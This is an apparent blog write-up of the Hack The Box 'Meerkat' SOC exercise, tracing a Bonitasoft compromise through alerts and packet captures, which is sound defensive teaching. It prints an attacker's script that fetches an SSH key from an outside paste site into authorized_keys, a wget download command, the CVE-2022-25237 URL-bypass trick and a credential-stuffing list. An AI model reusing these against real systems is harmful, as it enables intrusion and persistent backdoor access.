---
title: "HTB Sherlock Meerkat"
date: 2024-06-12T04:45:17-04:00
tags:
  - htb
  - sherlock
  - soc
  - pcap
  - siem
  - alerts
  - json
  - wireshark
  - jq
  - forensic
  - exploit
  - linux
---

# Meerkat - SOC

### Scenario
As a fast-growing startup, Forela has been utilising a business management platform. Unfortunately, our documentation is scarce, and our administrators aren't the most security aware. As our new security provider we'd like you to have a look at some PCAP and log data we have exported to confirm if we have (or have not) been compromised.

### Artifacts
| Artifact            | MD5 Hash                         | Password    |
| ------------------- | -------------------------------- | ----------- |
| meerkat.zip         | 9b8369a0fcd7f95889c28da597951ad3 | hacktheblue |
| meerkat-alerts.json | f9642326d526c4f5159470b1c5d89b4a | n/a         |
| meerkat.pcap        | 7ac62b1e835e0850104f1fc2ecf1f002 | n/a         |

### Tools Used
+ `jq` JSON parser - Analyzing the JSON file.
+ WireShark - Analyzing the PCAP file.

### Forensic Analysis

**Using `jq` I quickly searched for alerts with severity level 1.**
```json
$ cat meerkat-alerts.json| jq '.[] | select(.alert.severity==1)' | less
<--snip-->
{
  "ts": "2023-01-19T15:31:31.042Z",
  "event_type": "alert",
  "src_ip": "156.146.62.213",
  "src_port": 53196,
  "dest_ip": "172.31.6.44",
  "dest_port": 8080,
  "vlan": null,
  "proto": "TCP",
  "app_proto": "http",
  "alert": {
    "severity": 1,
    "signature": "ET WEB_SPECIFIC_APPS Bonitasoft Default User Login Attempt M1 (Possible Staging for CVE-2022-25237)",
    "category": "Attempted Administrator Privilege Gain",
    "action": "allowed",
    "signature_id": 2036815,
    "gid": 1,
    "rev": 1,
    "metadata": {
      "signature_severity": [
        "Minor"
      ],
      "former_category": [
        "WEB_SPECIFIC_APPS"
      ],
      "attack_target": [
        "Server"
      ],
      "deployment": [
        "SSLDecrypt",
        "Perimeter"
      ],
      "affected_product": null,
      "created_at": [
        "2022_06_03"
      ],
      "performance_impact": [
        "Low"
      ],
      "updated_at": [
        "2022_06_03"
      ],
      "malware_family": null,
      "tag": null,
      "cve": [
        "CVE_2022_25237"
      ]
    }
  },
  "flow_id": 1652763046938834,
  "pcap_cnt": 2168,
  "tx_id": 0,
  "icmp_code": null,
  "icmp_type": null,
  "tunnel": null,
  "community_id": "1:0XAwrtog1jdopmX+yd1WRDEzMAc="
}
```

Looks like a TA was brute forcing the default credentials for Bonitasoft to exploit the CVE-2022-25237. I confirmed the credential stuffing attack by analyzing the PCAP file.

**PCAP Analysis Using WireShark**
![alt text](images/20240612174728.png)

Analyzing the PCAP file it was confirmed that the TA successfully gained access to an account with the credential `seb.broom@forela.co.uk:g0vernm3nt`. And then gained privileged access to the Web Application's REST API by exploiting CVE-2022-25237. After getting privileged access to the Bonita web service the TA uploaded a malicious API extension to get command execution on the web application server.
![alt text](images/20240612175559.png)

The TA successfully gained command execution on the server.
![alt text](images/20240612181452.png)
![alt text](images/20240612181529.png)


**CVE-2022-25237**
According to [NIST](https://nvd.nist.gov/vuln/detail/CVE-2022-25237), *Bonita Web 2021.2 is affected by a authentication/authorization bypass vulnerability due to an overly broad exclude pattern used in the RestAPIAuthorizationFilter. By appending ;i18ntranslation or /../i18ntranslation/ to the end of a URL, users with no privileges can access privileged API endpoints. This can lead to remote code execution by abusing the privileged API actions.*

HTTP Object Extraction:
![alt text](images/20240612180604.png)

After discovering this incident I extracted all the HTTP TCP stream objects from the PCAP file and found the usernames and passwords combination list used in this security incident. 
```csv
user,password
Clerc.Killich%40forela.co.uk,vYdwoVhGIwJ
Lauren.Pirozzi%40forela.co.uk,wsp0Uy
Merna.Rammell%40forela.co.uk,u7pWoF36fn
Gianina.Tampling%40forela.co.uk,maUIffqQl
Konstance.Domaschke%40forela.co.uk,6XLZjvD
Vida.Murty%40forela.co.uk,4ulecG
Elka.Cavet%40forela.co.uk,n1aSdc
Noam.Harvett%40forela.co.uk,VDt8bh
Norbie.Bartolini%40forela.co.uk,GV2zlop
Cariotta.Whife%40forela.co.uk,x3hoU0
Mella.Amsberger%40forela.co.uk,4nIYM5WqN
Cyndy.Element%40forela.co.uk,ybWxct
Imelda.Braben%40forela.co.uk,dC7bjGLYB
Marven.Samuel%40forela.co.uk,LPU0qQnt108
Osborne.Humpatch%40forela.co.uk,OJ4WHcI4D
Talya.Sterman%40forela.co.uk,3gCERZ2JMh
Drusilla.Nice%40forela.co.uk,l35Euh0T3Am
Tobiah.Horstead%40forela.co.uk,fp0OQl
Kayley.Northway%40forela.co.uk,s9MC7mkdVU
Adora.Mersh%40forela.co.uk,85Hh8JZkJR6
Guss.Botten%40forela.co.uk,sVMRgGmv0sE
Cordelie.Rostron%40forela.co.uk,mAtdcJh
Ellerey.Bierling%40forela.co.uk,Nva0nKTz
Berny.Ferrarin%40forela.co.uk,lPCO6Z
Nefen.Heffernon%40forela.co.uk,VR0ZA8
Skipton.Pickerill%40forela.co.uk,lcsui1Nu
Nola.Crichmer%40forela.co.uk,QGa58W3L
Sharon.Claus%40forela.co.uk,3X4d06I
Bernelle.Draycott%40forela.co.uk,MmxlUAWe0oW
Samaria.Percifull%40forela.co.uk,CUgc3hzHw5g
Puff.Yapp%40forela.co.uk,M08Aae
Cynthia.Hatto%40forela.co.uk,z0NXI6
seb.broom%40forela.co.uk,g0vernm3nt
Alexi.Siman%40forela.co.uk,iUS11pX
Pete.Panons%40forela.co.uk,BKdkGTB
Rakel.Cawley%40forela.co.uk,h4gW3YLwnW9t
Merl.Lavalde%40forela.co.uk,BgfiOVXNLBc
Antoinette.Vittel%40forela.co.uk,bGtHL8cg
Stanleigh.Tuckwell%40forela.co.uk,VQCk8TGn3
Denny.Gepson%40forela.co.uk,q2JqCSXk69
Aline.Rivallant%40forela.co.uk,gFixyf1nGgf
Jordain.Eykel%40forela.co.uk,rnMXBNdNW0
Gypsy.Henric%40forela.co.uk,lLPqVgmHs5F
Adrea.Shervil%40forela.co.uk,7YoFhtUq
Jenilee.Pressman%40forela.co.uk,3eYwLOKhQEcl
Fredrick.Gerraty%40forela.co.uk,W1By0HUByDHO
Ebony.Oleszcuk%40forela.co.uk,uAWnyfKOjQM
Garrard.Colisbe%40forela.co.uk,jMi9iP
Farleigh.Schouthede%40forela.co.uk,JzI6Dvhy
Ahmed.Monteaux%40forela.co.uk,6uskrtw8U
Griffith.Lumm%40forela.co.uk,QPepd0M8wBK
Winston.Conville%40forela.co.uk,cEmh5W2Vh
Pat.Kloisner%40forela.co.uk,N8ZwVMzF6
Teresita.Benford%40forela.co.uk,uvYjtQzX
Mathian.Skidmore%40forela.co.uk,TQSNp6XrK
Gerri.Cordy%40forela.co.uk,w15pvWGTK
```

I also found an interesting file named `bx5gcr0et8`.
```json
{"p":"0","c":"1","cmd":"wget https://pastes.io/raw/bx5gcr0et8","out":"--2023-01-19 15:38:52--  https://pastes.io/raw/bx5gcr0et8\nResolving pastes.io (pastes.io)... 66.29.132.145\nConnecting to pastes.io (pastes.io)|66.29.132.145|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 113 [text/plain]\nSaving to: \u2018bx5gcr0et8\u2019\n\n     0K                                                       100% 57.8M=0s\n\n2023-01-19 15:38:53 (57.8 MB/s) - \u2018bx5gcr0et8\u2019 saved [113/113]\n\n","currentDate":"2023-01-19"}
```

A command was issued to download the file from `pastes.io`.
![alt text](images/20240612181638.png)

And then another command was issued to run the `bx5gcr0et8` file which was a bash script.
![alt text](images/20240612181813.png)

The contents of the bash script `bx5gcr0et8`:
```bash
**#!/bin/bash
curl https://pastes.io/raw/hffgra4unv >> /home/ubuntu/.ssh/authorized_keys
sudo service ssh restart**
```

A persistence technique identified by MITRE with a technique ID [T1098.004](https://attack.mitre.org/techniques/T1098/004/). Basically, the adversary used a public key and inserted in into the `/home/ubuntu/.ssh/authorized_keys` file. In this technique the TA can also set the derivative `PubkeyAuthentication` set to `yes` in the `/etc/ssh/sshd_config` file. And, also can modify the `sshd_config` file further and set the `RSAAuthentication` to the value `yes`, if the public key algorithm is RSA based.

The Public Key used by the TA:
```text
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCgruRMq3DMroGXrcPeeuEqQq3iS/sAL3gryt+nUqbBA/M+KG4ElCvJS4gP2os1b8FMk3ZwvrVTdpEKW6wdGqPl2wxznBjOBstx6OF2yp9RIOb3c/ezgs9zvnaO07YC8Sm4nkkXHgkabqcM7rHEY4Lay0LWF9UbxueSAHIJgQ2ADbKSnlg0gMnJTNRwKbqesk0ZcG3b6icj6nkKykezBLvWc7z4mkSm28ZVTa15W3HUWSEWRbGgJ6eMBdi7WnWXZ92SYDq0XUBV2Sx2gjoDGHwcd6I0q9BU52wWYo3L3LaPEoTcLuA+hnn82086oUzJfmEUtWGlPAXfJBN7vRIMSvsN
```


### Summary
The threat actors used credential stuffing attack against the Bonita Service and escalated their privileges in the web application by exploiting CVE-2022-25237. After that to get remote code execution on the server the threat actors uploaded a malicious extension file which gave them command injection ability. Then, they used this ability to get information of the users and added a SSH backdoor to the `ubuntu` user account for persistence.
